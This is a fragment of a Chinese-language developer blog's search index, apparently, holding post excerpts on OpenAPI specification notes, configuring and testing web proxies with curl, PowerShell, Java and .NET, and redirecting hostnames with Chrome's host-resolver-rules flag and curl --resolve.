which declare a regex pattern for the field name. 固定欄位 花樣欄位 RECOMMENDED 為了讓JSON和YAML格式來回切換，我們推薦 YAML - Failsafe Schema - 極客書 MUST YAML Tag 必須最低要求符合JSON規則。ref:YAML Ain’t Markup Language (YAML™) Version 1.2 YAML地圖中使用的鍵必須僅限於標量字符串，如YAML Failsafe Schema規則集所定義。YAML Ain’t Markup Language (YAML™) Version 1.2 NOTE: 我們定義 API 使用 OpenAPI 文件可以是 YAML 或 JSON格式。但是 API Request和 Response 的Body不一定是要 JSON 或 YAML。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:2","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"文件結構 MAY OpenAPI 文件可以由一個和多個、分段個文件，這部分由編寫者決定。在這種情況下，Reference Object和Schema Object的 $ref 可以被使用。 RECOMMENDED 通常 OpenAPI document 的根文件命名使用 openapi.jsonor openapi.yaml. ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:3","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"資料型態 OAS 的資料型態基於 JSON Schema Specification Draft 2020-12，請注意，整數(Integer)作為類型也得到了支持，並將其定義為沒有分數或指數部分的JSON號。使用Schema Object定義模型，該對像是JSON Schema規範2020-12的超集。 如JSON Schema驗證詞彙所定義的draft-bhutton-json-schema-validation-00，資料類型可以具有可選的修飾符屬性 注意Number和Integer差異。Number是含小數點數字。可以看Numeric types — Understanding JSON Schema 2020-12 documentation ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:4","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Rich Text Formatting 在整個規範中，description字段被認為是支持Commark Markdown格式的支持。 MUST 如果OpenAPI Tooling呈現豐富的文本，則必須至少支持CommonMark 0.27所述的降級語法。 MAY 工具可以選擇忽略一些共同標記功能來解決安全問題。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:5","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Relative References in URIs MAY 除非另有說明，否則所有 URIs 的屬性都可以是[RFC3986]定義的相對引用。 這邊不知道 URL和 URI是什麼可以看一下URL和URI傻傻分不清，差別到底在哪裡？。 相對引用，包括在reference-object和path-item-object的$ref欄位。link-object的externalValue根據[RFC3986]，使用引用文檔作為基本URI解決。 如果URI包含片段標識符，則應根據引用文檔的片段分辨率來解析片段。如果引用文檔的表示為JSON或YAML，則根據[RFC6901]，應將片段標識符解釋為 JSON-Pointer。 JSON Pointer 不知道可以看Overview of JSON Pointer | Baeldung，感覺跟 JSON Path 有點像。也可以看這篇JSON Pointer。 正如JSON模式規范草案2020-12所述，Schema Objects中的相對引用，包括任何以$id值出現的引用，使用最近的父$id作為基URI。如果沒有包含$id的父模式，則必須根据[RFC3986]确定基URI。 jsonschema - ‘$id’ property usage in JSON Schema - Stack Overflow JSON Schema 规范（中文版） 不過我看文件沒有$id範例，所以這邊就不先深入探討。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:6","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Relative References in URLs 除非另有說明，否則所有屬性URL的屬性可能是[RFC3986]定義的相對引用。除非另有說明，否則使用Service Object 中定義為基本 URL解決相對引用。請注意，這些本身可能與引用文檔有關。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:7","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Schema 在下面的描述中，如果一個字段沒有顯式的REQUIRED或用MUST或SHALL描述，它可以被認為是OPTIONAL。 以下真的太多內容了，所以我覺得不重要的就不會記到這邊。 OpenAPI Object REQUIRED openapi(string) OAS 版本 info(Info Object) 資訊 paths([Paths Object]) The available paths and operations for the API. OPTIONAL components([Components Object]) 可寫定義元件 security([Security Requirement Object]) API 安全用 tags([Tag Object]) 分類用 externalDocs(External Documentation Object) 額外文件 servers([Server Object]) Sever 資訊 webhooks 3.1.0才有的東西，目前不知道有什麼特別作用。 Info Object 該對象提供有關API的元數據。如果需要，客戶可以使用元數據，並可以在編輯或文檔生成工具中呈現。 REQUIRED title(string) version(string) OPTIONAL summary(string) description(string) contact(Contact Object) license(License Object) Server Object REQUIRED url(string) 可以用誇號字段{brackets}搭配variablesfield來搭配變數使用。 OPTIONAL description variables(Map[string, Server Variable Object]) 可以搭配 url 變數使用 This object MAY be extended with Specification Extensions. 可以使用Specification Extensions作擴展 範例 servers: - url: https://development.gigantic-server.com/v1 description: Development server - url: https://staging.gigantic-server.com/v1 description: Staging server - url: https://api.gigantic-server.com/v1 description: Production server servers: - url: https://{username}.gigantic-server.com:{port}/{basePath} description: The production API server variables: username: # note! no enum here means it is an open value default: demo description: this value is assigned by the service provider, in this example `gigantic-server.com` port: enum: - '8443' - '443' default: '8443' basePath: # open meaning there is the opportunity to use special base paths as assigned by the provider, default is `v2` default: v2 Server Variable Object REQUIRED default(string) If the enum is defined, the value MUST exist in the enum’s values OPTIONAL enum description Components Object schemas (Map[string, Schema Object]) responses (Map[string, Response Object | Reference Object]) parameters (Map[string, Parameter Object | Reference Object]) examples (Map[string, Example Object | Reference Object]) requestBodies (Map[string, Request Body Object | Reference Object]) headers (Map[string, Header Object | Reference Object]) securitySchemes (Map[string, Security Scheme Object | Reference Object]) links (Map[string, Link Object | Reference Object]) callbacks (Map[string, Callback Object | Reference Object]) pathItems (Map[string, Path Item Object | Reference Object]) This object MAY be extended with Specification Extensions. All the fixed fields declared above are objects that MUST use keys that match the regular expression: ^[a-zA-Z0-9.-_]+$. Paths Object /{path} (Path Item Object) 必須要/開頭。規則上面Path Templating有提到 This object MAY be extended with Specification Extensions. Paths Object Example Path Item Object $ref (string) summary (string) description (string) get (Operation Object) put (Operation Object) post (Operation Object) delete (Operation Object) options (Operation Object) head (Operation Object) patch (Operation Object) trace (Operation Object) servers ([Server Object]) parameters ([Parameter Object | Reference Object]) 這邊文件有特別說明 Paramters 這些參數可以在操作級別上覆蓋，但不能在此處刪除。 該列表不得包含重複的參數。 MUST NOT 唯一參數由name和location的組合定義。 這邊名稱是指這個(name)、location是指這個(in) 該列表可以使用參考對象鏈接到 OpenAPI Object’s components/parameters的參數。 Operation Object Operation Object 這邊比較意外沒有必填寫項目。 我把我覺得重要的簡單寫一下。先前寫過事項就不再寫了 operationId (string) 用于標識操作的惟一字符串。id在API中描述的所有操作中必須是唯一的。operationId區分大小寫。工具和庫可以使用operationId來唯一標識一個操作，因此，建議遵循通用的編程命名約定。 tags summary description requestBody(Request Body Object | Reference Object) 在其他情況下，HTTP規格模糊（例如GET，HEAD和DELETE），請求機體被允許但沒有明確定義的語義，應避免使用。 ==\u003e這邊我是認為 POST時候可能就會用到這個 responses (Responses Object) 從執行此操作返回的可能responses的列表。 deprecated (boolean) 聲明此操作要棄用。消費者應避免使用聲明的操作。默認值為false。 security ([Security Requirement Object]) servers ([Server Object]) Parameter Object 這邊注意用的參數有四種類型，請看下面。 Parameter Locations There are four possible parameter locations specified by the in field: path - Used together with Path Templating, where the parameter value is actually part of the operation’s URL. This d","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:8","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"彩蛋 如何利用 OpenAPI 及 WebHooks 讓老舊的網路服務也可程式化 [筆記] Postman 常見的 Content-type. 使用 Postman 來測試 Restful API 是相當方便的，但對於… | by R. H. | hobo engineer | Medium ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:4:0","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"有些公司網路會限制連線只能走 Web Proxy 方式傳輸，程式或主機都要設置外，要怎麼知道電腦通過 Proxy 網路有沒有通，這邊有找到一些方法，在工作上可以試試看。 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:0:0","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"什麼是 Proxy? ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:1:0","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"正向代理(Forward Proxy) 代理（英語：Proxy）也稱網路代理，是一種特殊的網路服務，允許一個終端（一般為客戶端）通過這個服務與另一個終端（一般為伺服器）進行非直接的連接。一些閘道器、路由器等網路裝置具備網路代理功能。一般認為代理服務有利於保障網路終端的隱私或安全，在一定程度上能夠阻止網路攻擊。 以上來自 Wiki，通常我們說的 Proxy 是指正向代理。 代理伺服器 - 維基百科，自由的百科全書 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:1:1","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"反向代理(Reverse Proxy) 反向代理（Reverse proxy）在電腦網路中是代理伺服器的一種。伺服器根據客戶端的請求，從其關聯的一組或多組後端伺服器（如Web伺服器）上取得資源，然後再將這些資源返回給客戶端，客戶端只會得知反向代理的IP位址，而不知道在代理伺服器後面的伺服器叢集的存在[1]。 與前向代理不同，前向代理作為客戶端的代理，將從網際網路上取得的資源返回給一個或多個的客戶端，伺服器端（如Web伺服器）只知道代理的IP位址而不知道客戶端的IP位址；而反向代理是作為伺服器端（如Web伺服器）的代理使用，而不是客戶端。客戶端藉由前向代理可以間接存取很多不同網際網路伺服器（叢集）的資源，而反向代理是供很多客戶端都通過它間接存取不同後端伺服器上的資源，而不需要知道這些後端伺服器的存在，而以為所有資源都來自於這個反向代理伺服器。 反向代理在現時的網際網路中並不少見，而另一些例子，像是CDN、SNI代理等，是反向代理結合DNS的一類延伸應用。 下面這篇還滿有趣 用人類語言跟你說甚麼是正向代理(Forward Proxy)和反向代理(Reve - PressPlay Academy 線上課程學習平台 其他文章可以參考: 系統設計 - 正向代理跟反向代理 · jyt0532’s Blog 備份圖 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:1:2","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"簡單來說 正向代理通常設定是在 Client 設定，把他指引到別的私福器傳出去。現在 Client 很少掛 Proxy，以前在 Hinet 逛大陸網站就會比較快，但後來 Hinet 關掉 Proxy 就沒什麼機會使用。不過，最近公司某環境需要掛 Proxy 才能連到外面網站，可用這個機制管理連外部網站。 反向代理設定通常在 Server，透過緩向代理做 SLB(Server Load Balance)，可以以解析憑證內部用 http，可舒緩 Server 做第六層東西，也後端部屬程式的人都有機會接觸到。 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:1:3","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"原理與說明 Proxy server 的運作流程 當 Proxy server 第一次發現要去的 URL 網址時，他的資料存取流程如下： Client 端向 Server 端發送一個資料需求封包； Server 端接收之後，先比對這個封包的『來源』與預計要前往的『目標』網站是否為可接受？ 如果來源與目標都是合法的，或者說，來源與目標網站我們的 Proxy 都能幫忙取得資料時，那麼 Server 端會開始替 Client 取得資料。這個步驟中比較重要的就是『比對政策』啦，有點像是認證的感覺啦； Server 發現快取並沒有 Client 所需要的資料，準備前往網際網路抓取資料； Server 開始向 Internet 發送要求與取得相關資料； 最後當然就是將資料回傳給 Client 端囉！ 當 Proxy server 本身的快取就有用戶要求的 URL 資料時： a. Client 端向 Server 端發送一個資料需求封包； b. Server 端接收之後，開始進行政策比對 (如同前一組步驟 2 的說明)； c. Server 首先會檢查自己快取 (新的資料可能在記憶體中，較舊的資料則放置在硬碟上) 資料， 如果有 Client 所需的資料，那就將資料準備取出，而不經過向 Internet 要求資料的程序； d. 最後當然就是將資料回傳給 Client 端囉！ 來源: 鳥哥第 11 堂課 - 進階網頁伺服器設定 + proxy 想當初以前有用 squid，不過我發現我文章沒有記錄，可能那時候一時興起架設，然後忘記紀錄。可能覺得我用不太到，最近爬文發現 Apache也能做到， Apache Proxy 設定 – 盧尛朋友。連結留著紀錄。 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:2:0","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"快速架設 Forward Proxy Server docker run --rm -d -p 3128:3128 hinata/nginx-forward-proxy:latest curl -x http://127.0.0.1:3128 https://www.google.co.jp ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:2:1","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"command 呼叫 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:3:0","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"linux 環境變數套用 Proxy 但這邊可以不用這樣設定，可以用下面curl方法。 # Set up proxy without username and password export http_proxy=http://SERVER:PORT/ # Set up proxy with username and password export http_proxy=http://USERNAME:PASSWORD@SERVER:PORT/ # Set up proxy with domain, username and password export http_proxy=http://DOMAIN\\\\USERNAME:PASSWORD@SERVER:PORT/ 參考: How to set up proxy using http_proxy \u0026 https_proxy environment variable in Linux? ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:3:1","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"curl(linux) 測試 Proxy 連線網站 這個方法可以在 Window 用 Git Bash 也是能用的喔。 curl https://api.line.me/oauth2/v2.1/token -x http://172.25.165.200:8080 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:3:2","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"powershell 設定 Proxy 連線網站 這個我就沒使用，因為這個好像會設定套用，感覺不是我要的那一種單純指令測試。 # 看 proxy 設定 netsh winhttp show proxy # 設定 proxy netsh winhttp set proxy \"192.168.0.14:3128\" #忽略 proxy URL 清單 netsh winhttp set proxy \"192.168.1.100:3128\" bypass-list= \"10.*,172.*,192.168.*,*.corp.woshub.com\" # 判斷是否有忽略 Proxy 清單 ([System.Net.WebRequest]::GetSystemWebproxy()).IsBypassed(\"http://woshub.com\") # 從這個網站取得 IP (Invoke-WebRequest -uri \"http://ifconfig.me/ip\").Content Using PowerShell Behind a Proxy Server | Windows OS Hub PowerShell cURL (Invoke-WebRequest): Syntax, Parameters, Examples Free Proxy List - Just Checked Proxy List curl http://tw.yahoo.com -Proxy http://125.21.3.41:8080 不知道為什麼我的 powershell 執行 curl 會有錯誤。最後發現用 Git Bash裡面的 curl 成功…，最後我的程式發現可以過。 這邊 window 的 powershell 的 curl 不是 linux curl 喔，他是 Invoke-WebRequest。 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:3:3","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"Postman Postman 測試 API 以為預設是用系統設定的Proxy，但後來發現要額外設定才會套用。 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:3:4","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"程式操作 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:4:0","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"Java Configure HTTP/HTTPS Proxy Settings Java java - How do I set the proxy to be used by the JVM - Stack Overflow 方法1. 設定java.net.useSystemProxies=true，吃本機代理設定，預設為 false。不太理解為什麼預設要為 false。 -Djava.net.useSystemProxies=true System.setProperty(\"java.net.useSystemProxies\", \"true\"); 方法2. 設定http.proxyHost // HTTP -Dhttp.proxyHost=http://proxy.memorynotfound.com -Dhttp.proxyPort=80 // HTTPS -Dhttps.proxyHost=https://proxy.memorynotfound.com -Dhttps.proxyPort=443 ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:4:1","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"Net Core 不用像 Java 要額外設定。 HttpClient.DefaultProxy 屬性 (System.Net.Http) | Microsoft Docs .NetCore HttpClient Proxy 设置全局代理 手動設定順便紀錄 string baseUrl = \"https://api.line.me\"; var client = new RestClient(baseUrl); if (_config.GetValue\u003cbool\u003e(\"UseProxy\")) { client.Proxy = new WebProxy(_config.GetValue\u003cstring\u003e(\"ProxyUrl\")); } if (_config.GetValue\u003cbool\u003e(\"UseProxy\")) { string proxyurl = _config.GetValue\u003cstring\u003e(\"ProxyUrl\"); var webProxy = new WebProxy(proxyurl); var proxyHttpClientHandler = new HttpClientHandler { Proxy = webProxy, UseProxy = true, }; client = new HttpClient(proxyHttpClientHandler); } else { client = new HttpClient(); } ","date":"2023-01-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/:4:2","tags":["proxy","web","command"],"title":"程式使用 Web Proxy 那些事和指令測試方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-Web-Proxy-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%92%8C%E6%8C%87%E4%BB%A4%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"最近要找有沒有簡單可以在電腦測試特定網域網站連到指定主機，有想過改在 hosts 檔案，但又不想影響電腦程式連線功能，有看到 Chrome 裝套件可以達成目的，但我發現有比較好的方法，透過指令參數就可以達成這個問題。 ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:0:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"套件方法 https://github.com/Riant/chrome-simply-proxy Riant/chrome-simply-proxy: Chrome 的简易代理插件 有看到有人說替換網域用 proxy 作法會比較好 ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:1:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"Chrome 指令參數調整(推薦) 注意，使用時要先把 Chrome 關掉，這樣才不會影響。還需要注意導向網站需要活者，沒有活著的話會是倒到真正網頁，所以需要特別注意。 # 任意網域調整 127.0.0.1 chrome.exe --host-resolver-rules=\"MAP * 127.0.0.1:5000\" --no-proxy-server chrome.exe --host-resolver-rules=\"MAP * 127.0.0.1\" --no-proxy-server chrome.exe --host-resolver-rules=\"MAP httpbin.org 127.0.0.1\" --no-proxy-server Simulate manipulation of the etc/hosts file in Google Chrome - Super User ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:2:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"CURL 也可以這樣用 參考:Chrome 指定域名解析，绕过 hosts - Est’s Blog 參數： -4, –ipv4 -6, –ipv6 –dns-interface \u003cinterface\u003e –dns-ipv4-addr \u003cip-address\u003e Tell curl to bind to \u003cip-address\u003e when making IPv4 DNS requests –dns-ipv6-addr \u003cip-address\u003e Tell curl to bind to \u003cip-address\u003e when making IPv6 DNS requests –dns-servers \u003cip-address,ip-address\u003e Set the list of DNS servers to be used instead of the system default. The list of IP addresses should be separated with commas. Port numbers may also optionally be given as :\u003cport-number\u003e after each IP address. –resolve \u003chost:port:address\u003e Make the curl requests(s) use a specified address and prevent the otherwise normally resolved address to be used. Consider it a sort of /etc/hosts alternative provided on the command line. The port number should be the number used for the specific protocol the host will be used for. It means you need several entries if you want to provide address for the same host but different ports. This option can be used many times to add many host names to resolve. (Added in 7.21.3) 最後一個很有用 😹 curl http://www.example.com --resolve www.example.com:80:127.0.0.1 參考: Use cURL’s “–resolve” option to pin a request to an IP address 